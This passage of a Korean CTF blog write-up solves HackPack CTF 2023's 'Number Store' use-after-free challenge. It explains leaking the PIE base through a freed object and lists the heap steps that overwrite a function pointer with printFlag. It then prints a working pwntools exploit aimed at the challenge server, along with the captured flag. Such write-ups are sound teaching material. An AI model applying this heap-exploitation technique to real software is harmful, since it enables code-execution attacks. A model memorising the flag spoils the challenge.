<p>우리는 <code>generateRandNum</code> 함수 대신 <code>printFlag</code> 함수를 실행할 것이다. 그러면 바로 <code>func_result = ((__int64 (*)(void))_func_result[2])();</code> 이 라인에서 함수가 실행되어 <code>flag.txt</code>가 보일 것이다.</p>
<h3 id="How-to-leak"><a href="#How-to-leak" class="headerlink" title="How to leak"></a>How to leak</h3><p>문제는 이 문제에 <code>pie</code>가 걸려있다. <code>leak</code>은 어떻게 하면 좋을까? 아래 함수를 이용하자.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">readObject</span><span class="params">(<span class="type">int</span> idx, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *s; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  s = *(<span class="type">char</span> **)(<span class="number">8LL</span> * idx + a2);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>, *((_QWORD *)s + <span class="number">2</span>));   <span class="comment">// 주소 leak</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>*((_QWORD *)s + 2)</code>을 출력하는 것으로 보아 <code>name_ptr</code>의 <code>num</code>을 출력해준다. 이 함수를 통해 <code>leak</code>을 할 수 있는데, 먼저 <code>obj</code> 구조체를 만들고 해제한다. 그 다음 <code>createRandomNum</code> 함수를 통해 <code>obj[x]</code>가 가리키는 <code>name_ptr+2</code> 즉 <code>num</code> 위치에 <code>generateRandNum</code> 함수 포인터가 위치하게 한다. 마지막으로 <code>readObject</code> 함수를 실행시켜 <code>generateRandNum</code> 함수의 주소를 구하고 <code>pie address</code>까지 구할 수 있다.</p>
<h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ol>
<li><code>createStaticNum</code> 함수를 이용하여 <code>malloc</code></li>
<li><code>deleteObject</code> 함수를 이용하여 <code>free</code></li>
<li><code>createRandomNum</code> 함수를 이용하여 <code>num</code> 위치에 <code>func_ptr</code>이 위치하도록 <code>malloc</code></li>
<li><code>readObject</code> 함수를 이용하여 <code>pie</code> 주소 <code>leak</code></li>
<li><code>deleteObject</code> 함수를 이용하여 <code>free</code></li>
<li><code>createStaticNum</code> 함수를 이용하여 <code>malloc</code> 이 때 <code>num</code> 위치에 <code>printFlag</code> 함수 주소 입력</li>
<li><code>deleteObject</code> 함수를 이용하여 <code>free</code></li>
<li><code>6</code>번 메뉴를 이용하여 <code>printFlag</code> 함수 실행<ul>
<li>이것이 가능한 이유가 아래와 같이 태초에 한 번만 random한 수를 받기 때문이다. <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">    <span class="keyword">if</span> ( !_func_result )</span><br><span class="line">    _func_result = createRandomNum();</span><br><span class="line">    func_result = ((__int64 (*)(<span class="type">void</span>))_func_result[<span class="number">2</span>])();<span class="comment">// printFlag 실행</span></span><br></pre></td></tr></table></figure></li>
<li>3번 과정에서 <code>createRandomNum</code> 함수를 한 번 실행했으므로 <code>_func_result</code>은 이미 값이 채워져있다.</li>
</ul>
</li>
</ol>
<h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./chal&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;cha.hackpack.club&#x27;</span>, <span class="number">41705</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chal&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createStaticNum</span>(<span class="params">idx, name, addr</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;(0-9): &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;name: &#x27;</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;number: &#x27;</span>, <span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deleteObject</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;(0-9): &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak pie</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readObject</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;(0-9): &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createRandomNum</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># show flag.txt</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">showRandomNum</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="built_in">str</span>(<span class="number">7</span>))</span><br><span class="line"></span><br><span class="line">createStaticNum(<span class="number">0</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">1234</span>)</span><br><span class="line">deleteObject(<span class="number">0</span>)</span><br><span class="line">createRandomNum()</span><br><span class="line">readObject(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recvline(), <span class="number">10</span>) - <span class="number">0x1257</span></span><br><span class="line">info(<span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line">deleteObject(<span class="number">0</span>)</span><br><span class="line">createStaticNum(<span class="number">0</span>, <span class="string">&#x27;aaaa&#x27;</span>, e.address + <span class="number">0x1244</span>) <span class="comment"># e.sym[&#x27;printFlag&#x27;]</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">deleteObject(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">createRandomNum()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;n3v3r_tru5t_fr33_jVmVsEuj&#125;</span><br></pre></td></tr></table></figure>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/tags/">Tag</a></li>
         
          <li><a href="/categories/">Category</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">1.</span> <span class="toc-text">Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#How-to-leak"><span class="toc-number">1.1.</span> <span class="toc-text">How to leak</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solve"><span class="toc-number">2.</span> <span class="toc-text">Solve</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">2.1.</span> <span class="toc-text">Exploit Code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag"><span class="toc-number">2.2.</span> <span class="toc-text">Flag</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/230417-hackpackctf2023-number_store/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/230417-hackpackctf2023-number_store/&text=HackPack CTF 2023 - Number Store (UAF)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/230417-hackpackctf2023-number_store/&title=HackPack CTF 2023 - Number Store (UAF)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/230417-hackpackctf2023-number_store/&is_video=false&description=HackPack CTF 2023 - Number Store (UAF)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HackPack CTF 2023 - Number Store (UAF)&body=Check out this article: https://jiravvit.github.io/230417-hackpackctf2023-number_store/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/230417-hackpackctf2023-number_store/&title=HackPack CTF 2023 - Number Store (UAF)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/230417-hackpackctf2023-number_store/&title=HackPack CTF 2023 - Number Store (UAF)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/230417-hackpackctf2023-number_store/&title=HackPack CTF 2023 - Number Store (UAF)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/230417-hackpackctf2023-number_store/&title=HackPack CTF 2023 - Number Store (UAF)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/230417-hackpackctf2023-number_store/&name=HackPack CTF 2023 - Number Store (UAF)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/230417-hackpackctf2023-number_store/&t=HackPack CTF 2023 - Number Store (UAF)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2022-2025
    HyeonJi Son
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'jiravvit-github-io';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>

<!-- utterances Comments -->

</body>
</html>
